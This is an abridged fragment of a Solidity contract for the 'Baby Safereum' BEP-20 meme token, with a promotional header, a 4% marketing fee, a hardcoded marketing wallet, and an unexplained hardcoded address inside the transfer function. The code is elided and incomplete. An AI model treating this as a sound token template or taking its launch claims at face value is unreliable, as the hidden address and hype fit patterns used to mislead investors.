/**
Welcome to Baby Safereum

Stealth Launch soon!

A brand new token on binance smart chain inspirated by Safereum
Get rewards just for holding $BBYSAFE  Join a project with a serious CEO & team ready to work hard to take this up!
...
🔐Liquidity will be locked right after launch🔐
*/
...
contract Babysafereum is Context, IERC20, Ownable {
    ...
    string private constant _name = "Baby Safereum"; // 
    string private constant _symbol = "BBYSAFE"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 4;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0xFB548e0935f14504C80ad7b3F2CcA1849e4e7E34;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0xb79e9391c249F37cfA2320BcCb0601575bf53E2c;
